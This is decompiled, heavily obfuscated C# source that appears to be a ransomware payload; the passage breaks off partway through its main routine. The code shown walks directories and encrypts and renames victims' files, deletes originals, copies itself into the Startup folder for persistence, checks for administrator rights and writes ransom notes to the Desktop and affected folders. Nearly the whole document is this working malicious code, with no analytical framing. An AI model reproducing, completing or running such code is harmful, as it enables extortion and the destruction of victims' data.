using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using FYOYoJCRzAFbLHG;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

internal sealed class sjdJQieILoWa
{
	public sealed class UmeeXFfEDL
	{
		private static StringCollection SsujzJxYuHwmD;

		private static List<string> srnCLYgFIJajbH;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107412520));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107395474)) && !text.ToLower().Contains(getString_0(107412515)) && !text.ToLower().Contains(getString_0(107395440)) && !text.ToLower().Contains(getString_0(107394883)) && !text.ToLower().Contains(getString_0(107394858)) && !text.ToLower().Contains(getString_0(107394873)) && !text.ToLower().Contains(getString_0(107394737)) && !text.ToLower().Contains(getString_0(107394688)) && !text.ToLower().Contains(getString_0(107394703)) && !text.ToLower().Contains(getString_0(107394654)) && !text.ToLower().Contains(getString_0(107395149)) && !text.ToLower().Contains(getString_0(107395164)) && !text.ToLower().Contains(getString_0(107395115)) && !text.ToLower().Contains(getString_0(107395102)) && !text.ToLower().Contains(getString_0(107395081)) && !text.ToLower().Contains(getString_0(107395100)) && !text.ToLower().Contains(getString_0(107395087)) && !text.ToLower().Contains(getString_0(107395038)) && !text.ToLower().Contains(getString_0(107395021)) && !text.Contains(HaBpHuAelnemsPrlU(getString_0(107395036))) && !text.Contains(getString_0(107394979)) && !text.Contains(getString_0(107394998)) && !text.EndsWith(getString_0(107396567)) && !text.EndsWith(getString_0(107394969)) && !text.EndsWith(getString_0(107394964)) && !text.EndsWith(getString_0(107394959)) && !text.EndsWith(getString_0(107394922)) && !text.ToLower().Contains(getString_0(107394917)) && !text.ToLower().Contains(zfpGlTGxsRHeuPKIg))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ZWzWxnSFNWW) * 1024.0 * 1024.0 && nKBzlLZizip == getString_0(107396877))
							{
								srnCLYgFIJajbH.Add(text);
							}
							else if (File.Exists(text) && nKBzlLZizip == getString_0(107396728))
							{
								srnCLYgFIJajbH.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return srnCLYgFIJajbH;
		}

		static UmeeXFfEDL()
		{
			Strings.CreateGetStringDelegate(typeof(UmeeXFfEDL));
			SsujzJxYuHwmD = new StringCollection();
			srnCLYgFIJajbH = new List<string>();
		}
	}

	private sealed class jDBokznxspHpvL
	{
		private sealed class XVxXUsVsnRBIYOclL
		{
			public jDBokznxspHpvL AEzzbRqIEAA;

			public string lGpUfZkBFLJLte;

			public void _003CCrypt_003Eb__1b()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					TxZkaYeuDLcA(WindowsIdentity.GetCurrent().Name, lGpUfZkBFLJLte);
				}
			}

			public void _003CCrypt_003Eb__1c()
			{
				lGSFYGrwWWc(lGpUfZkBFLJLte, AEzzbRqIEAA.BNkXbxpuSrtMA, AEzzbRqIEAA.qsqSzUryHRGaed, AEzzbRqIEAA.ajsbIIrLNN, AEzzbRqIEAA.pSDcCfpskUKC);
			}
		}

		public string[] BNkXbxpuSrtMA;

		public string[] ajsbIIrLNN;

		public string pSDcCfpskUKC;

		public string qsqSzUryHRGaed;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1a(string string_0)
		{
			XVxXUsVsnRBIYOclL CS_0024_003C_003E8__locals0 = new XVxXUsVsnRBIYOclL();
			CS_0024_003C_003E8__locals0.AEzzbRqIEAA = this;
			CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					TxZkaYeuDLcA(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte);
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (lECemNXjMIUDo == getString_0(107396882))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lGSFYGrwWWc(CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.BNkXbxpuSrtMA, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.qsqSzUryHRGaed, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.ajsbIIrLNN, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.pSDcCfpskUKC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lGSFYGrwWWc(CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte, BNkXbxpuSrtMA, qsqSzUryHRGaed, ajsbIIrLNN, pSDcCfpskUKC);
			}
		}

		static jDBokznxspHpvL()
		{
			Strings.CreateGetStringDelegate(typeof(jDBokznxspHpvL));
		}
	}

	private sealed class EWGLVQtVHiz
	{
		public List<string> ERCVUYWoiQRHAlq;

		public List<string> EqWqZyWQAIdZY;

		public string BLREATJZTJYPo;

		public string[] xduYbBWaFrGZjD;

		public string TYmpKQYXClI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__24(string string_0)
		{
			foreach (string item in EqWqZyWQAIdZY)
			{
				if (xduYbBWaFrGZjD.Length != 0)
				{
					string[] array = xduYbBWaFrGZjD;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0415;
					}
				}
				if (!item.EndsWith(string_0) || mlJZHNmKGbGNL.Contains(item))
				{
					continue;
				}
				if (OQpPiZFfDfeJnl == getString_0(107396890))
				{
					try
					{
						if (rVuhOXCLdTVWc.ZqqaRYwhNgM(item))
						{
							rVuhOXCLdTVWc.dhjFpQPRquAt(item);
						}
					}
					catch
					{
					}
				}
				mlJZHNmKGbGNL.Add(item);
				if (!ynDzKjPwCccASf.Contains(Path.GetDirectoryName(item)))
				{
					ynDzKjPwCccASf.Add(Path.GetDirectoryName(item));
				}
				vevZQODlBrS(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception)
					{
						goto end_IL_00d3;
					}
					if (DIrQLiGWxURvBsQx == getString_0(107396890) && new FileInfo(item).Length > Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024 && !ERCVUYWoiQRHAlq.Contains(string_0))
					{
						if (izPLAKDXDdmSpa == getString_0(107396890))
						{
							foreach (string item2 in tSGlhJqTqwPK)
							{
								if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == getString_0(107396890))
								{
									if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > new FileInfo(item).Length)
									{
										try
										{
											BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395999), getString_0(107395962), getString_0(107395949), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == getString_0(107396741))
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395999), getString_0(107395962), getString_0(107395949), item);
									}
									catch
									{
									}
								}
							}
						}
						string text = GQlnVygCdRpmP.qVmZqPZzCiOa(32);
						string s = sQxNUKPLoNNt.CRaOncPudd(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = jNSEdZYoBdBdhxmH.VfdLPRMCiCJnTgGS(item, Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024);
						array2 = ((!rMlrRPtvGSmPo) ? (IFSnWiZXyf ? jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IFSnWiZXyf ? OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						jNSEdZYoBdBdhxmH.WUzJtkzHTRDzhk(item, array2, bytes);
						if (BLREATJZTJYPo != getString_0(107394621))
						{
							File.Move(item, item + BLREATJZTJYPo);
						}
					}
					else if (BLREATJZTJYPo != getString_0(107394621))
					{
						FRqvFKZQFT(item, item + BLREATJZTJYPo, yqKEaKaJbO);
					}
					else
					{
						FRqvFKZQFT(item, item + getString_0(107394584), yqKEaKaJbO);
					}
					goto IL_0415;
					end_IL_00d3:;
				}
				catch (Exception)
				{
					goto IL_0415;
				}
				continue;
				IL_0415:
				EqWqZyWQAIdZY.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__25(string string_0)
		{
			if (xduYbBWaFrGZjD.Length != 0)
			{
				string[] array = xduYbBWaFrGZjD;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!string_0.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_03d9;
				}
			}
			if (!mlJZHNmKGbGNL.Contains(string_0))
			{
				if (OQpPiZFfDfeJnl == getString_0(107396890))
				{
					try
					{
						if (rVuhOXCLdTVWc.ZqqaRYwhNgM(string_0))
						{
							rVuhOXCLdTVWc.dhjFpQPRquAt(string_0);
						}
					}
					catch
					{
					}
				}
				mlJZHNmKGbGNL.Add(string_0);
				if (!ynDzKjPwCccASf.Contains(Path.GetDirectoryName(string_0)))
				{
					ynDzKjPwCccASf.Add(Path.GetDirectoryName(string_0));
				}
				vevZQODlBrS(string_0);
				try
				{
					try
					{
						if (new FileInfo(string_0).Length != 0L)
						{
							goto end_IL_00ac;
						}
						goto end_IL_00ac_2;
						end_IL_00ac:;
					}
					catch (Exception)
					{
						goto end_IL_00ac_2;
					}
					if (DIrQLiGWxURvBsQx == getString_0(107396890) && new FileInfo(string_0).Length > Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024)
					{
						if (izPLAKDXDdmSpa == getString_0(107396890))
						{
							foreach (string item in tSGlhJqTqwPK)
							{
								if (string_0.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396890))
								{
									if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > new FileInfo(string_0).Length)
									{
										try
										{
											BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395999), getString_0(107395962), getString_0(107395949), string_0);
										}
										catch
										{
										}
									}
								}
								else if (string_0.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396741))
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395999), getString_0(107395962), getString_0(107395949), string_0);
									}
									catch
									{
									}
								}
							}
						}
						string text = GQlnVygCdRpmP.qVmZqPZzCiOa(32);
						string s = sQxNUKPLoNNt.CRaOncPudd(text);
						Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = jNSEdZYoBdBdhxmH.VfdLPRMCiCJnTgGS(string_0, Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024);
						array2 = ((!rMlrRPtvGSmPo) ? (IFSnWiZXyf ? jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IFSnWiZXyf ? OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						jNSEdZYoBdBdhxmH.WUzJtkzHTRDzhk(string_0, array2);
						if (BLREATJZTJYPo != getString_0(107394621))
						{
							File.Move(string_0, string_0 + BLREATJZTJYPo);
						}
					}
					else if (BLREATJZTJYPo != getString_0(107394621))
					{
						FRqvFKZQFT(string_0, string_0 + BLREATJZTJYPo, yqKEaKaJbO);
					}
					else
					{
						FRqvFKZQFT(string_0, string_0 + getString_0(107394584), yqKEaKaJbO);
					}
					end_IL_00ac_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_03d9;
			IL_03d9:
			EqWqZyWQAIdZY.Remove(string_0);
		}

		static EWGLVQtVHiz()
		{
			Strings.CreateGetStringDelegate(typeof(EWGLVQtVHiz));
		}
	}

	private sealed class xIlDwtBAOCA
	{
		public string hXQwhyyUChxW;

		public string hiCFhHjJlOYV;

		public void _003CEncrypt2_003Eb__2c()
		{
			while (true)
			{
				try
				{
					File.Delete(hXQwhyyUChxW);
					break;
				}
				catch
				{
					Thread.Sleep(1000);
				}
			}
		}

		public void _003CEncrypt2_003Eb__2d()
		{
			while (true)
			{
				try
				{
					if (File.Exists(hiCFhHjJlOYV))
					{
						File.Delete(hiCFhHjJlOYV);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1000);
				}
			}
		}
	}

	public static string UIDPHteqvzfbK;

	public static byte[] yqKEaKaJbO;

	public static string nKBzlLZizip;

	public static string ZWzWxnSFNWW;

	public static List<string> eiFKYbjMTwOFPW;

	public static List<string> IEQajUMVRVBXY;

	public static string BRbrMiVGtCEo;

	public static string TYmpKQYXClI;

	public static string oJAyRMQdLb;

	public static int gnqIHQBwBLyhk;

	public static string OQpPiZFfDfeJnl;

	public static string dZgvfPWkHgoi;

	public static string xYNERQemnofjJm;

	public static string oAGWPSwqtIetQZ;

	public static string HyPsaTMavROVgnA;

	public static string qAMOEwnKXE;

	public static string jnzaVyrTCJX;

	public static string IbbTiLEHloiMm;

	public static List<string> NDbhdbSCPL;

	public static List<string> ynDzKjPwCccASf;

	public static string jUDtqXyLEDEHHER;

	public static string iGZNDiAjpDclE;

	public static string ckAvGZnyCZ;

	public static List<string> mlJZHNmKGbGNL;

	public static string jvPfFiwuBQwY;

	private static string cilpKuzoUbTSW;

	public static string lECemNXjMIUDo;

	public static string ltvOdQrMyPPaInM;

	public static List<string> ZGhIruVHdPFYtlWZP;

	public static List<string> nUfyhadkiCc;

	public static List<string> YeqlzLfCpLfm;

	public static List<string> aDGslaPvgQQ;

	public static string sSEPqFEDMqTaEztS;

	public static List<string> wIrQjgjhsFi;

	public static List<string> PovUsIuWBfWY;

	public static string tZBqMZENpOl;

	public static string PHXMYTfEdWuqv;

	internal static DateTime lBpMZwssNAVHee;

	internal static DateTime YEpXxnRyQyz;

	public static string DIrQLiGWxURvBsQx;

	public static string CqCuqTxSfTnQ;

	public static string FhZgSOmQPUBkE;

	public static string JtjhvVAVmnd;

	public static string HZhecATKOk;

	public static string DVwLtNIOWBqWK;

	public static string OHCENHhzoDk;

	public static string izPLAKDXDdmSpa;

	public static List<string> tSGlhJqTqwPK;

	public static string cQQwPgPIQsTI;

	public static string poTRwsJJYnkOD;

	public static string UZGWwcQQYPPUo;

	public static string LllENvnbVdRI;

	public static string rZwGEnyOGWN;

	public static string sACfsHBDdJYyuqh;

	public static string MrRtcOxGgYQ;

	public static string HWPaScceTHODQ;

	public static string SPzYcnQJiWJZ;

	public static string SYmlQShVIuDaqSM;

	public static string ZPyxsrDZBETCcFX;

	public static string lNczJDqhFFcKuh;

	public static string dqDQddDBKAy;

	public static string uBISjgAHNOPpSt;

	public static string TbLGHDHnuu;

	public static string DvwipBJMlK;

	public static string pVZSTBaJDhmyrp;

	public static string GhocQMyuaXGqcRiX;

	public static string EsdgWPawGzhpFa;

	public static string zfpGlTGxsRHeuPKIg;

	public static string UFKyCAYrxbqDdi;

	public static string jjyVphVScKkaB;

	public static string OGtBeWwtXu;

	public static string wKhiWePuGUErTI;

	public static string hJIliGmLQLK;

	public static string QZCsItKVUvbo;

	public static string arGoDVhqgCh;

	public static string TdcmBpWqTeC;

	public static string kcodLppuPOB;

	public static string[] mgkfkwKGBpQPji;

	public static string fjTNcifXIFVhG;

	public static bool rMlrRPtvGSmPo;

	public static string CSbFbwAGbeuoD;

	public static bool IFSnWiZXyf;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			MkvipMqXnnWZlmoD.UUaBKGpgiQoqR(cilpKuzoUbTSW);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QZCsItKVUvbo == getString_0(107396874))
			{
				Thread thread = new Thread(SDkMssCdFZhX.mNeIQJDFiRSTaQ);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (xYNERQemnofjJm == getString_0(107396874))
		{
			Thread.Sleep(int.Parse(oAGWPSwqtIetQZ));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && OHCENHhzoDk == getString_0(107396874))
		{
			try
			{
				dEkqYlxVdJb(HaBpHuAelnemsPrlU(getString_0(107396869)));
			}
			catch
			{
			}
		}
		try
		{
			if (jnzaVyrTCJX == getString_0(107396874) && OGVgHuCHGGzhtV.LpXYEtDRdtVA())
			{
				OGVgHuCHGGzhtV.DJXiJOyjjIqeW();
			}
		}
		catch (Exception)
		{
		}
		if (iGZNDiAjpDclE == getString_0(107396874) && OGVgHuCHGGzhtV.LpXYEtDRdtVA())
		{
			new AwnrAEXPGRgsG().cgYiOCsKyYwZ(bool_0: false);
			new AwnrAEXPGRgsG().nVbbGLOxlhbeKxP();
		}
		if (dZgvfPWkHgoi == getString_0(107396874))
		{
			kJGeMsGZmbaxJ.NYiRfShDdXWuWFm();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396764);
		string text2 = text + Path.GetFileName(fileName);
		if (oJAyRMQdLb == getString_0(107396874) && fileName != text2)
		{
			Thread thread2 = new Thread(vnvHhCqPXaDTpuJZ);
			thread2.IsBackground = true;
			thread2.Priority = ThreadPriority.Normal;
			thread2.Start();
		}
		if (BRbrMiVGtCEo == getString_0(107396874) && mainModule != null && fileName != text2)
		{
			try
			{
				gnqIHQBwBLyhk = VHRftuEkfsvRIG(0, NDbhdbSCPL.Count);
				File.Copy(fileName, text + NDbhdbSCPL[gnqIHQBwBLyhk], overwrite: true);
				Process.Start(text + NDbhdbSCPL[gnqIHQBwBLyhk]);
				pkRYqBCsNjQnL();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (tZBqMZENpOl == getString_0(107396874) && DateTime.Now < lBpMZwssNAVHee)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (PHXMYTfEdWuqv == getString_0(107396874) && DateTime.Now > YEpXxnRyQyz)
			{
				pkRYqBCsNjQnL();
			}
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> zGhIruVHdPFYtlWZP = ZGhIruVHdPFYtlWZP;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate(string string_0)
					{
						DfMsLiBapm(getString_0(107394559), string_0);
					};
				}
				Parallel.ForEach(zGhIruVHdPFYtlWZP, CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
				List<string> source = nUfyhadkiCc;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						DfMsLiBapm(getString_0(107394578), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> yeqlzLfCpLfm = YeqlzLfCpLfm;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), string_0);
					};
				}
				Parallel.ForEach(yeqlzLfCpLfm, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (kcodLppuPOB == getString_0(107396874))
				{
					string[] source2 = mgkfkwKGBpQPji;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), getString_0(107394544) + string_0 + getString_0(107394503));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				lYIttWtMyAuqKQB(sSEPqFEDMqTaEztS);
				List<string> source3 = aDGslaPvgQQ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394498)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source4 = wIrQjgjhsFi;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394473)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> povUsIuWBfWY = PovUsIuWBfWY;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						DfMsLiBapm(getString_0(107394488), string_0);
					};
				}
				Parallel.ForEach(povUsIuWBfWY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				Thread thread4 = new Thread(mOkpVxsIHuQ.jFqZkVnQJdf);
				thread4.IsBackground = true;
				thread4.Start();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			DfMsLiBapm(getString_0(107396791), getString_0(107396746));
		}
		if (FhZgSOmQPUBkE == getString_0(107396725))
		{
			TYmpKQYXClI = GQlnVygCdRpmP.qVmZqPZzCiOa(8);
			TYmpKQYXClI += GQlnVygCdRpmP.qVmZqPZzCiOa(8);
			TYmpKQYXClI += GQlnVygCdRpmP.qVmZqPZzCiOa(8);
			TYmpKQYXClI += GQlnVygCdRpmP.qVmZqPZzCiOa(8);
		}
		else
		{
			TYmpKQYXClI = getString_0(107396720);
		}
		string text3 = sQxNUKPLoNNt.CRaOncPudd(TYmpKQYXClI);
		ErOmnLggUFCj.EJIxdtvlPdIz(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), zfpGlTGxsRHeuPKIg), WHWDNVZeNEQC(text3), null, null, getString_0(107397155), getString_0(107397170), null);
		try
		{
			PImTFNGQOXP(new string[1] { getString_0(107397121) }, new string[100]
			{
				getString_0(107397144),
				getString_0(107397139),
				getString_0(107397134),
				getString_0(107397093),
				getString_0(107397088),
				getString_0(107397083),
				getString_0(107397110),
				getString_0(107397105),
				getString_0(107397100),
				getString_0(107397063),
				getString_0(107397058),
				getString_0(107397053),
				getString_0(107397076),
				getString_0(107397071),
				getString_0(107397030),
				getString_0(107397025),
				getString_0(107397020),
				getString_0(107397047),
				getString_0(107397042),
				getString_0(107397037),
				getString_0(107396996),
				getString_0(107396991),
				getString_0(107397018),
				getString_0(107397013),
				getString_0(107397008),
				getString_0(107397003),
				getString_0(107396966),
				getString_0(107396961),
				getString_0(107396956),
				getString_0(107396983),
				getString_0(107396978),
				getString_0(107396973),
				getString_0(107396424),
				getString_0(107396419),
				getString_0(107396442),
				getString_0(107396437),
				getString_0(107396432),
				getString_0(107396427),
				getString_0(107397110),
				getString_0(107396390),
				getString_0(107397100),
				getString_0(107396381),
				getString_0(107396408),
				getString_0(107396403),
				getString_0(107396398),
				getString_0(107396361),
				getString_0(107396356),
				getString_0(107396351),
				getString_0(107396378),
				getString_0(107396373),
				getString_0(107396368),
				getString_0(107396363),
				getString_0(107396326),
				getString_0(107396321),
				getString_0(107396316),
				getString_0(107396343),
				getString_0(107396338),
				getString_0(107396333),
				getString_0(107396292),
				getString_0(107396287),
				getString_0(107396310),
				getString_0(107396265),
				getString_0(107396390),
				getString_0(107396252),
				getString_0(107396275),
				getString_0(107396234),
				getString_0(107396225),
				getString_0(107396248),
				getString_0(107396239),
				getString_0(107396202),
				getString_0(107396193),
				getString_0(107396216),
				getString_0(107396207),
				getString_0(107396682),
				getString_0(107396677),
				getString_0(107396672),
				getString_0(107396667),
				getString_0(107396694),
				getString_0(107396689),
				getString_0(107396648),
				getString_0(107396643),
				getString_0(107396638),
				getString_0(107396665),
				getString_0(107396660),
				getString_0(107396655),
				getString_0(107396614),
				getString_0(107396605),
				getString_0(107396632),
				getString_0(107396424),
				getString_0(107396627),
				getString_0(107396622),
				getString_0(107396585),
				getString_0(107396580),
				getString_0(107396575),
				getString_0(107396598),
				getString_0(107396593),
				getString_0(107396588),
				getString_0(107396547),
				getString_0(107396542),
				getString_0(107396569)
			}, new string[0], TYmpKQYXClI, getString_0(107396564));
		}
		catch
		{
		}
		TYmpKQYXClI = GQlnVygCdRpmP.qVmZqPZzCiOa(32);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519));
				streamWriter.WriteLine(HaBpHuAelnemsPrlU(getString_0(107396482)));
				streamWriter.WriteLine(getString_0(107395832));
				streamWriter.WriteLine(HaBpHuAelnemsPrlU(getString_0(107395827)));
				streamWriter.WriteLine(text3);
				if (lECemNXjMIUDo == getString_0(107396725))
				{
					streamWriter.WriteLine(getString_0(107395832));
					streamWriter.WriteLine(HaBpHuAelnemsPrlU(getString_0(107395794)) + Convert.ToString(mlJZHNmKGbGNL.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519), getString_0(107395685) + text3);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in ynDzKjPwCccASf)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107396519)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519), item + getString_0(107396519), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107396519), getString_0(107395685) + text3);
				}
			}
			catch (Exception)
			{
			}
			if (num > 10)
			{
				break;
			}
		}
		if (OGtBeWwtXu == getString_0(107396874))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396168)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396168));
					streamWriter2.WriteLine(HaBpHuAelnemsPrlU(getString_0(107396131)));
					streamWriter2.WriteLine(getString_0(107395832));
					streamWriter2.WriteLine(HaBpHuAelnemsPrlU(getString_0(107396146)));
					streamWriter2.WriteLine(text3 + HaBpHuAelnemsPrlU(getString_0(107396057)));
					if (lECemNXjMIUDo == getString_0(107396725))
					{
						streamWriter2.WriteLine(getString_0(107395832));
